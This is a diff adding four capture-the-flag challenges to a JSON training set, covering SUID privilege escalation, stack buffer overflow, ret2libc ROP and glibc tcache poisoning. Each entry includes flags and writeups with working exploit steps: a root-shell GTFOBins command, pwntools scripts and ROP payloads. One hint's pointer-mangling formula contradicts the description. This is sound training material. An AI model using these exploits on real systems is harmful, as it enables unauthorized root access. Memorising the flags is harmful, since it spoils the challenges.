@@ -142,5 +142,106 @@
     "cheatsheet": "dig +nocmd TXT target.gov.ph +noall +answer",
     "badge": "DNS Scout",
     "writeup": "Querying TXT records exposes verification strings including the flag."
+  },
+  {
+    "id": "misc-7",
+    "title": "Linux SUID & Capability Exploitation",
+    "category": "Misc/OSINT",
+    "points": 100,
+    "difficulty": "Easy",
+    "source": "OverTheWire Bandit / GTFOBins",
+    "description": "You gained unprivileged shell access to an Ubuntu container. Enumerate system binaries with SUID bits or elevated Linux capabilities to spawn an interactive root shell.",
+    "hints": [
+      "Find SUID binaries using: `find / -perm -u=s -type f 2>/dev/null`.",
+      "Check GTFOBins for binaries like `base64`, `find`, `vim`, or check `getcap -r / 2>/dev/null`."
+    ],
+    "hintPenalties": [
+      -10,
+      -20
+    ],
+    "flag": "CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}",
+    "concepts": [
+      "Linux Privilege Escalation",
+      "SUID",
+      "GTFOBins",
+      "Capabilities"
+    ],
+    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}`"
+  },
+  {
+    "id": "misc-8",
+    "title": "Classic Stack Buffer Overflow (Ret2Win)",
+    "category": "Misc/OSINT",
+    "points": 250,
+    "difficulty": "Medium",
+    "source": "picoCTF / ROP Emporium",
+    "description": "A 64-bit ELF executable `vuln` reads 128 bytes into a 32-byte stack buffer using `gets()`. ASLR and stack canaries are disabled, and the binary contains an uncalled function `win()` at address `0x401176`. Overflow the return address to hijack execution.",
+    "hints": [
+      "Calculate padding offset: 32 bytes buffer + 8 bytes saved RBP = 40 bytes.",
+      "Payload structure: `40 * b'A' + p64(win_address)`."
+    ],
+    "hintPenalties": [
+      -15,
+      -25
+    ],
+    "flag": "CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}",
+    "concepts": [
+      "Buffer Overflow",
+      "Ret2Win",
+      "pwntools",
+      "x86-64 Stack Frame"
+    ],
+    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}`"
+  },
+  {
+    "id": "misc-9",
+    "title": "Return-Oriented Programming (Ret2Libc)",
+    "category": "Misc/OSINT",
+    "points": 450,
+    "difficulty": "Hard",
+    "source": "CSAW / DEFCON CTF",
+    "description": "Target server runs with No-Execute (NX/DEP) enabled, preventing shellcode execution on the stack. Leak a libc address (`puts` GOT entry) to calculate libc base, then build a ROP chain to call `system('/bin/sh')`.",
+    "hints": [
+      "Use ROP gadgets like `pop rdi; ret` to pass pointers in 64-bit calling convention.",
+      "Stage 1: Leak `puts` GOT address using `puts(puts_got)`. Stage 2: Calculate `libc_base = leaked_puts - puts_offset`. Call `system(binsh)`."
+    ],
+    "hintPenalties": [
+      -20,
+      -40
+    ],
+    "flag": "CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}",
+    "concepts": [
+      "ROP",
+      "Ret2Libc",
+      "GOT Overwrite",
+      "ASLR Bypass",
+      "pwntools"
+    ],
+    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
+  },
+  {
+    "id": "misc-10",
+    "title": "Glibc 2.35 Tcache Poisoning Heap Exploit",
+    "category": "Misc/OSINT",
+    "points": 500,
+    "difficulty": "Hard",
+    "source": "DEFCON CTF / TokyoWesterns",
+    "description": "An allocation note service allows allocating, editing, and freeing chunks. An off-by-one UAF allows corrupting chunk forward pointers. Bypass Glibc 2.35 safe linking (pointer mangling `L = (P >> 12) ^ Target`) to allocate a chunk over `__environ` and hijack control flow.",
+    "hints": [
+      "In glibc 2.32+, tcache pointers are mangled with random ASLR page offsets: `P' = (P >> 12) ^ P`.",
+      "Leak heap base first to demangle pointers, then poison tcache entry to point to return address on stack."
+    ],
+    "hintPenalties": [
+      -25,
+      -50
+    ],
+    "flag": "CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}",
+    "concepts": [
+      "Heap Exploitation",
+      "Tcache Poisoning",
+      "Safe Linking",
+      "glibc 2.35"
+    ],
+    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
   }
 ]
